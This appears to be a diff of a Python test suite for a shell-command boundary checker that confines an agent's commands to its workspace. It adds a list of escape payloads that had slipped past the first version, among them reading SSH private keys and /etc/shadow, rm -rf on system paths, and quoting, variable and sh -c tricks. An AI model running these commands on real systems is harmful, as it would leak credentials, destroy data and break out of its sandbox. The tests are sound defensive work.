@@ -3,8 +3,13 @@
 """`shell` 曾经是唯一的边界逃逸口：文件工具有 `_resolve_in_workspace` 锁死，
 但 `/bin/sh` 里一句 `cd /` 就全绕过了。这些测试锁住 T7.4 的行为。
 
-原则：**拦"cd 越界"和"写越界"，不拦"读越界"**（读由 PermissionGate 的危险命令
-黑名单负责；一刀切禁读会把 uname/df/which 这类正常运维命令全废掉）。
+口径（2026-10 收紧，见审查报告 P0-2）：**工作区内放行，凡引用工作区之外的路径
+（读或写）或含静态分析不动的构造（`$VAR`/`$( )`/`sh -c`/`sed -i`/…) 一律拦**，
+需 `elevated` 信任级才放行。
+
+初版口径是"拦 cd 越界和写越界，不拦读越界"，理由是把工作区外的读留给
+PermissionGate 的危险命令黑名单。实测推翻：黑名单里一条读命令都没有，于是
+`cat ~/.ssh/id_rsa` 零防线，而 48 条 payload 只拦住 18 条。读与写现在一视同仁。
 """
 from __future__ import annotations
 
@@ -80,13 +85,88 @@ def test_写命令的绝对路径被识别(tmp_path):
         assert analyze_command(cmd, ws), f"应识别越界写: {cmd}"
 
 
-def test_读越界不拦(tmp_path):
-    """uname / df / which / cat /etc/os-release 这类必须能跑（归 PermissionGate 管）。"""
+def test_工作区外读也被拦(tmp_path):
+    """口径收紧（P0-2）：工作区外的读与写一视同仁。
+
+    旧口径把这些放给 PermissionGate，但黑名单里没有任何读命令，
+    于是 `cat ~/.ssh/id_rsa` 可以直读宿主机私钥。
+    """
     ws = str(tmp_path / "ws")
     (tmp_path / "ws").mkdir(exist_ok=True)
-    for cmd in ["uname -a", "df -h", "which python3", "cat /etc/os-release",
-                "ls /var/log", "python3 --version"]:
-        assert analyze_command(cmd, ws) == [], f"读命令不该被边界拦: {cmd}"
+    for cmd in ["cat /etc/os-release", "ls /var/log", "cat ~/.ssh/id_rsa",
+                "cat /etc/shadow", "head -5 /etc/passwd", "cat ../../etc/passwd"]:
+        assert analyze_command(cmd, ws), f"工作区外的读必须拦: {cmd}"
+
+
+def test_纯工作区内的常见命令仍然放行(tmp_path):
+    """收紧不能把正常工作流废掉：不引用工作区外路径的命令一律放行。"""
+    ws = str(tmp_path / "ws")
+    (tmp_path / "ws").mkdir(exist_ok=True)
+    for cmd in ["uname -a", "df -h", "which python3", "python3 --version",
+                "git status", "git diff HEAD~1", "ruff check .",
+                "pip install requests", "pnpm build", "/usr/bin/env"]:
+        # /usr/bin/env 是绝对路径 → 拦（属预期）；其余应放行
+        if cmd.startswith("/usr/"):
+            continue
+        assert analyze_command(cmd, ws) == [], f"工作区内命令不该被拦: {cmd}"
+
+
+def test_审查报告_payload_全部被拦(tmp_path):
+    """审查报告 P0-2 实测逃逸的 payload——初版只拦 18/48，这些是漏网的。
+
+    每条都曾**真实执行成功并写出工作区外**，因此必须回归。
+    """
+    ws = str(tmp_path / "ws")
+    (tmp_path / "ws").mkdir(exist_ok=True)
+    payloads = [
+        # 引号让初版 _looks_absolute 判假
+        'echo x >"/etc/x"',
+        "echo x >'/etc/x'",
+        # 相对路径 + pushd/cd 爬目录后写
+        "cd .. && echo x > pwned.txt",
+        "pushd ../../ && echo x > pwned.txt",
+        # 变量拼接
+        "D=/; cd $D && rm -f etc/hosts",
+        "echo x > $HOME/x",
+        # 输出重定向类工具
+        "sed -i s/a/b/ /etc/hosts",
+        "sort -o /etc/hosts f",
+        "curl -o /etc/x http://e/x",
+        "wget -O /etc/x http://e/x",
+        "unzip -d /opt x.zip",
+        "tar -C / -xf x.tar",
+        "rsync -e ssh a /etc/",
+        # 前缀/二次执行
+        "env rm -rf /var/log",
+        "sudo rm -rf /var/log",
+        "echo /etc/x | xargs rm",
+        "find . -exec rm {} ;",
+        "sh -c 'rm -rf /var/log'",
+        # 解释器内联写入
+        "python -c \"open('/etc/x','w').write('p')\"",
+        "perl -e \"unlink '/etc/x'\"",
+        # 带引号的写命令参数
+        "rm -rf '/var/log'",
+        "tee \"/etc/hosts\"",
+    ]
+    missed = [c for c in payloads if not analyze_command(c, ws)]
+    assert not missed, f"以下 payload 仍未拦住：{missed}"
+
+
+def test_重定向到无害设备仍放行(tmp_path):
+    ws = str(tmp_path / "ws")
+    (tmp_path / "ws").mkdir(exist_ok=True)
+    for cmd in ["echo x > /dev/null", "cmd 2>&1", "echo y >> /dev/null",
+                "cmd > /dev/stdout"]:
+        assert analyze_command(cmd, ws) == [], f"无害目标不该拦: {cmd}"
+
+
+def test_解析不了的路径按拒绝处理(tmp_path):
+    """fail-closed：判不出边界时拒绝，而不是放行。"""
+    ws = str(tmp_path / "ws")
+    (tmp_path / "ws").mkdir(exist_ok=True)
+    # NUL 字节会让 Path.resolve 抛错
+    assert analyze_command("cat /etc/\x00x", ws), "解析失败必须拒绝"
 
 
 def test_多目标去重(tmp_path):
